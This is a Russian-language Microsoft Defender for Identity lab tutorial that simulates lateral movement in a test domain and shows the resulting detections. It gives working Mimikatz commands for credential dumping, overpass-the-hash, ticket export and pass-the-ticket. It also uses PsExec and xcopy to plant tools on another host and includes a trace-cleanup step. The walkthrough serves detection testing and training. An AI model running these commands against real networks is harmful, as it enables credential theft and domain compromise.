---
title: Сборник схем бокового смещения для отправки оповещений системы безопасности Microsoft Defender для удостоверений
description: В сборнике схем Microsoft Defender для удостоверений показано, как смоделировать угрозы бокового смещения для их обнаружения с помощью Defender для удостоверений.
ms.date: 10/26/2020
ms.topic: tutorial
ms.openlocfilehash: 50880150bb8937875677985f3a61119495d566eb
ms.sourcegitcommit: cdb7ae4580851e25aae24d07e7d66a750aa54405
ms.translationtype: HT
ms.contentlocale: ru-RU
ms.lasthandoff: 12/03/2020
ms.locfileid: "96542713"
---
# <a name="tutorial-lateral-movement-playbook"></a>Руководство. Сборник схем бокового смещения

Сборник схем бокового смещения входит в третье руководства серии из четырех частей по оповещениям системы безопасности [!INCLUDE [Product long](includes/product-long.md)]. Лаборатория оповещений системы безопасности [!INCLUDE [Product short](includes/product-short.md)] позволяет ознакомиться с возможностями **[!INCLUDE [Product short](includes/product-short.md)]** по обнаружению и определению подозрительных действий и потенциальных атак в сети. В сборнике схем показано, как проверить некоторые обнаружения [!INCLUDE [Product short](includes/product-short.md)]дискретных *действий*. Сборник схем описывает возможности [!INCLUDE [Product short](includes/product-short.md)] по работе с *сигнатурами* и не включает в себя обнаружения на основе поведения пользователей или сущностей с использованием расширенных возможностей машинного обучения, так как для их применения изучаемый период с реальным сетевым трафиком должен составлять до 30 дней. Дополнительные сведения о каждом руководстве из этой серии см. в статье [Руководство. Лаборатория оповещений системы безопасности [!INCLUDE [Product short](includes/product-short.md)]](playbook-lab-overview.md).

В этом сборнике представлены некоторые службы обнаружения угроз путей бокового смещения и службы оповещений системы безопасности [!INCLUDE [Product short](includes/product-short.md)]. Для этого моделируются атаки с использованием распространенных общедоступных средств взлома и атак.

Изучив данный учебник, вы научитесь:

> [!div class="checklist"]
>
> - Соберете NTLM-хэши и смоделируете атаку Overpass-the-Hash для получения билета на получение билетов Kerberos (TGT).
> - Замаскируетесь под другого пользователя, осуществите боковое смещение в сети и соберете больше учетных данных.
> - Смоделируете атаку Pass-the-Ticket, чтобы получить доступ к контроллеру домена.
> - Просмотрите оповещения системы безопасности для защиты от бокового смещения [!INCLUDE [Product short](includes/product-short.md)].

## <a name="prerequisites"></a>Предварительные условия

1. [Настроенная лаборатория оповещений системы безопасности в [!INCLUDE [Product short](includes/product-short.md)]](playbook-setup-lab.md).
    - Рекомендуем как можно точнее следовать инструкции при настройке лаборатории. Чем точнее параметры настроенной лаборатории совпадают с указанными в инструкции, тем проще будет выполнить процедуры тестирования [!INCLUDE [Product short](includes/product-short.md)].

2. [Выполнение заданий в сборнике схем рекогносцировки](playbook-reconnaissance.md).

## <a name="lateral-movement"></a>Боковое смещение

В результате наших смоделированных атак в предыдущем руководстве (сборнике схем рекогносцировки) мы получили подробную информацию о сети. Используя эти сведения, на этапе бокового смещения в лаборатории мы получим уже обнаруженные критически важные IP-адреса и просмотрим оповещения [!INCLUDE [Product short](includes/product-short.md)] о смещении. В предыдущей имитации лаборатории рекогносцировки мы определили 10.0.24.6 в качестве целевого IP-адреса, так как именно там были раскрыты учетные данные компьютера с помощью пользователя SamiraA. Мы имитируем различные методы атаки, чтобы попытаться выполнить боковое смещение по домену.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Создание дампа учетных данных в памяти с компьютера VictimPC

Во время наших ложных рекогносцировочных атак с использованием **VictimPC** предоставлялись не только учетные данные пользователя JeffL. На этом компьютере есть и другие полезные учетные данные. Чтобы выполнить боковое смещение с помощью **VictimPC**, мы попытаемся перечислить учетные данные в памяти общего ресурса. Создание дампа учетных данных в памяти с помощью **Mimikatz** является популярным методом атаки с использованием распространенного инструмента.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. Откройте **окно командной строки с повышенными правами** на компьютере **VictimPC**.
1. Перейдите в папку инструментов, где вы сохранили Mimikatz, и выполните следующую команду:

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```

1. Откройте файл **c:\\temp\\victimpc.txt**, чтобы просмотреть собранные учетные данные, которые инструмент Mimikatz нашел и записал в текстовый файл.
    ![Выходные данные Mimikatz, включая NTLM-хэш с данными RonHD](media/playbook-lateral-sekurlsa-logonpasswords-output.png)

1. Мы успешно получили из памяти NTLM-хэш с данными RonHD, используя Mimikatz. NTLM-хэш нам скоро понадобится.

    > [!Important]
    >
    > - Ожидаемо и нормально, что хэши, показанные в этом примере, отличаются от хэшей, которые вы видите в собственной лабораторной среде. Цель этого упражнения — помочь вам понять, как были получены хэши, получить их значения и использовать их на следующих этапах.
    > - В этой выборке также были раскрыты учетные данные учетной записи компьютера. Хотя учетные данные учетной записи компьютера бесполезны в нашей текущей лаборатории, помните, что это еще один способ, который реальные злоумышленники используют для бокового смещения в вашей среде.

### <a name="gather-more-information-about-the-ronhd-account"></a>Сбор дополнительных сведений об учетной записи RonHD

Злоумышленник может изначально не знать, кто такой RonHD или его ценность в качестве цели атаки. Он знает только то, что учетные данные можно использовать, если это выгодно. Однако, используя команду **​​net**, мы, выступая в качестве злоумышленника, можем обнаружить, к каким группам относится RonHD.

Выполните следующую команду на компьютере **VictimPC**:

```dos
net user ronhd /domain
```

![Рекогносцировка учетной записи RonHD](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Из результатов мы узнали, что RonHD входит в группу безопасности Helpdesk. Мы знаем, что RonHD дает нам привилегии, которые предоставляются в учетной записи *и* группе безопасности Helpdesk.

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

С использованием распространенной атаки **Overpass-the-Hash** и полученного NTLM-хэша мы получим билет на выдачу билетов (TGT). Злоумышленник с таким TGT может маскироваться под скомпрометированного пользователя, такого как RonHD. Маскируясь под RonHD, мы можем получить доступ к любому ресурсу домена, к которому имеет доступ скомпрометированный пользователь или группы безопасности, в которые он входит.

1. На компьютере **VictimPC** перейдите в папку, содержащую **Mimikatz.exe**, на место хранения в вашей файловой системе и выполните следующую команду:

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
    ```

    > [!Note]
    > Если ваш хэш для RonHD отличался на предыдущих шагах, замените NTLM-хэш выше на хэш, который вы получили из файла *victimpc.txt*.

    ![Выполнение атаки Overpass-the-hash с помощью Mimikatz](media/playbook-lateral-opth1.png)

1. Убедитесь, что открылась новая командная строка. Она будет выполняться от имени RonHD, но *пока* это может показаться неочевидным. Не закрывайте новую командную строку, так как она понадобится вам дальше.

[!INCLUDE [Product short](includes/product-short.md)] не обнаружит хэш, переданный в локальный ресурс. [!INCLUDE [Product short](includes/product-short.md)] определяет, когда хэш **используется из одного ресурса для доступа к другому ресурсу** или службе.

### <a name="additional-lateral-move"></a>Дополнительное боковое смещение

Теперь, когда мы получили учетные данные RonHD, есть ли у нас возможности доступа, которых у нас ранее не было с учетными данными JeffL?
Чтобы ответить на этот вопрос, мы используем команду **PowerSploit** ```Get-NetLocalGroup```.

1. В командной консоли, запущенной от имени RonHD, которая открылась из-за нашей предыдущей атаки, выполните следующий код:

    ```powershell
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
    Get-NetLocalGroup 10.0.24.6
    ```

    ![Получение сведений о локальных администраторах для IP-адреса 10.0.24.6 с использованием PowerSploit](media/playbook-lateral-adminpcsamr.png)

    На самом деле для идентификации локальных администраторов по обнаруженному IP-адресу, который был предоставлен учетной записи администратора домена, используется удаленное решение SAM.

    Результат будет выглядеть примерно так:

    ![Выходные данные команды PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

    У этого компьютера есть два локальных администратора: встроенная учетная запись администратора ContosoAdmin и учетная запись Helpdesk. Мы знаем, что RonHD является членом группы безопасности Helpdesk. Мы также знаем, что имя компьютера — AdminPC. Так как у нас есть учетные данные RonHD, у нас должна быть возможность использовать их для бокового смещения к AdminPC и получения доступа к этому компьютеру.

1. В той же командной строке *, которая выполняется в контексте RonHD*, введите **exit**, если вам нужно выйти из PowerShell. Затем выполните следующую команду:

    ```dos
    dir \\adminpc\c$
    ```

1. Мы успешно получили доступ к AdminPC. Посмотрим, какие билеты у нас есть. В той же командной строке выполните следующую команду:

    ```dos
    klist
    ```

    ![Использование klist для отображения билетов Kerberos в текущем процессе cmd.exe](media/playbook-lateral-klist.png)

Как видите, для этого конкретного процесса у нас в памяти находится TGT пользователя RonHD. Мы успешно выполнили атаку Overpass-the-Hash в нашей лаборатории. Мы преобразовали NTLM-хэш, который был скомпрометирован ранее, и использовали его для получения Kerberos TGT. Затем этот Kerberos TGT использовался, чтобы получить доступ к другому сетевому ресурсу (в данном случае AdminPC).

### <a name="overpass-the-hash-detected-in-product-short"></a>Обнаружение атаки Overpass-the-Hash в [!INCLUDE [Product short](includes/product-short.md)]

В консоли [!INCLUDE [Product short](includes/product-short.md)] мы увидим следующее:

![[!INCLUDE [Product short](includes/product-short.md)]: обнаружение атаки Overpass-the-Hash](media/playbook-lateral-opthdetection.png)

[!INCLUDE [Product short](includes/product-short.md)] было обнаружено, что учетная запись RonHD была скомпрометирована на компьютере VictimPC, а затем использована для успешного получения билета TGT Kerberos. Если мы щелкнем имя RonHD в оповещении, то перейдем к временной шкале логических действий RonHD, где сможем продолжить наше исследование.

![Просмотр обнаружения на временной шкале логических действий](media/playbook-lateral-opthlogicalactivity.png)

В Центре операций безопасности наш аналитик по безопасности узнает о скомпрометированных учетных данных и может быстро выяснить, для доступа к каким ресурсам они использовались.

## <a name="domain-escalation"></a>Эскалация домена

В результате нашей симулированной атаки мы получаем не только доступ к AdminPC, но также и права администратора на этом компьютере. Теперь мы можем выполнить боковое смещение к AdminPC и получить больше учетных данных.

Здесь мы выполним следующее:

- Установим инструмент Mimikatz на компьютере AdminPC.
- Получим билеты на компьютере AdminPC.
- Выполним атаку Pass-the-Ticket, чтобы получить учетные данные SamiraA.

### <a name="pass-the-ticket"></a>Pass-the-Ticket;

Из командной строки, запущенной в контексте *RonHD* на компьютере **VictimPC**, перейдите в расположение, где находятся наши инструменты для атаки. Затем выполните команду *xcopy*, чтобы переместить эти инструменты на компьютер AdminPC:

```dos
xcopy mimikatz.exe \\adminpc\c$\temp
```

При появлении запроса нажмите клавишу `d`, чтобы указать, что папка temp является каталогом на компьютере AdminPC.

![Копирование файлов на компьютер AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

Разместив Mimikatz на компьютере AdminPC, мы используем PsExec, чтобы выполнить команду удаленно.

1. Перейдите в расположение, где находится PsExec, и выполните следующую команду:

    ```dos
    PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
    ```

    Эта команда выполнит и экспортирует билеты, найденные в процессе LSASS.exe, и поместит их в текущий каталог на компьютере AdminPC.

1. Нам нужно скопировать билеты обратно на VictimPC с AdminPC. Так как в этом примере нас интересуют только билеты SamiraA, выполните следующую команду:

    ```dos
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```

    ![Экспорт полученных учетных данных с AdminPC обратно на VictimPC](media/playbook-escalation-export_tickets2.png)

1. Давайте очистим следы на AdminPC, удалив наши файлы.

    ```dos
    rmdir \\adminpc\c$\temp /s /q
    ```

    > [!Note]
    > Более опытные злоумышленники не будут использовать диск при выполнении произвольного кода на компьютере после получения на нем прав администратора.

    На компьютере **VictimPC** эти собранные билеты находятся в папке **c:\temp\adminpc_tickets**:

    ![C:\temp\tickets — это экспортированные выходные данные Mimikatz с компьютера AdminPC](media/playbook-escalation-export_tickets4.png)

### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

Теперь, когда билеты находятся локально на компьютере VictimPC, наконец-то пришло время стать пользователем SamiraA с помощью атаки Pass-the-ticket.

1. Из расположения **Mimikatz** в файловой системе **VictimPC** откройте новую командную строку **с повышенными привилегиями** и выполните следующую команду:

    ```dos
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```

    ![Импорт украденных билетов в процесс cmd.exe](media/playbook-escalation-ptt1.png)

1. В той же командной строке с повышенными привилегиями проверьте, что в сеансе командной строки используются правильные билеты. Выполните следующую команду:

    ```dos
    klist
    ```

    ![Выполнение команды klist, чтобы увидеть импортированные билеты в процессе CMD](media/playbook-escalation-ptt2.png)

1. Обратите внимание, что эти билеты остаются неиспользованными. Выступая в роли злоумышленника, мы успешно "передали билет". Мы получили учетные данные SamirA с компьютера AdminPC, а затем передали их другому процессу, выполняющемуся на компьютере VictimPC.

    > [!Note]
    > Как и в случае с Pass-the-Hash, [!INCLUDE [Product short](includes/product-short.md)] не знает, что билет был передан на основе действий локального клиента. Но [!INCLUDE [Product short](includes/product-short.md)] обнаруживает действие *после использования билета*, в частности для доступа к другому ресурсу или службе.

1. Завершите имитацию атаки, получив доступ к контроллеру домена с компьютера **VictimPC**. В командной строке, которая запущена с билетами SamirA в памяти, выполните:

    ```dos
    dir \\ContosoDC\c$
    ```

    ![Получение доступа к диску C компьютера ContosoDC с использованием учетных данных SamirA](media/playbook-escalation-ptt3.png)

Готово! Благодаря нашим имитациям атак мы получили доступ с правами администратора к контроллеру домена и смогли скомпрометировать лес домена Active Directory в нашей лаборатории.

### <a name="pass-the-ticket-detection-in-product-short"></a>Обнаружение атаки Pass-the-Ticket в [!INCLUDE [Product short](includes/product-short.md)]

Большинство инструментов безопасности не имеют возможности определить, когда для доступа к допустимому ресурсу использовались правомерные учетные данные. Что же обнаруживает и о чем оповещает [!INCLUDE [Product short](includes/product-short.md)] в этой цепочке событий?

- [!INCLUDE [Product short](includes/product-short.md)] была обнаружена кража билетов Samira с компьютера AdminPC и их перемещение на компьютер VictimPC.
- На портале [!INCLUDE [Product short](includes/product-short.md)] показано, какие ресурсы были получены с помощью украденных билетов.
- Azure ATP предоставляет основную информацию и доказательства, позволяющие точно определить, с чего начать исследование и какие меры следует предпринять, чтобы исправить ситуацию.

Обнаружения и сведения об оповещениях [!INCLUDE [Product short](includes/product-short.md)] имеют решающее значение для любой группы реагирования на инциденты, связанные с цифровой криминалистикой (DFIR). Вы можете не только увидеть, что украдены учетные данные, но и узнать, к каким ресурсам был получен доступ и какие ресурсы были скомпрометированы с использованием украденного билета.

![[!INCLUDE [Product short](includes/product-short.md)]: обнаружение атаки Pass-the-Ticket с двухчасовым подавлением](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Это событие отобразится в консоли [!INCLUDE [Product short](includes/product-short.md)] только через **2 часа**. События этого типа целенаправленно подавляются на этот период времени, чтобы уменьшить количество ложных срабатываний.

## <a name="next-steps"></a>Дальнейшие шаги

Следующим этапом в процессе атаки является захват управления доменом.

> [!div class="nextstepaction"]
> [Сборник схем захвата управления доменом для [!INCLUDE [Product short](includes/product-short.md)]](playbook-domain-dominance.md)

## <a name="join-the-community"></a>Присоединяйтесь к сообществу!

У вас есть дополнительные вопросы или вы хотите обсудить с другими пользователями особенности использования [!INCLUDE [Product short](includes/product-short.md)] или вопросы, связанные с безопасностью? Присоединяйтесь к [сообществу [!INCLUDE [Product short](includes/product-short.md)]](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection).
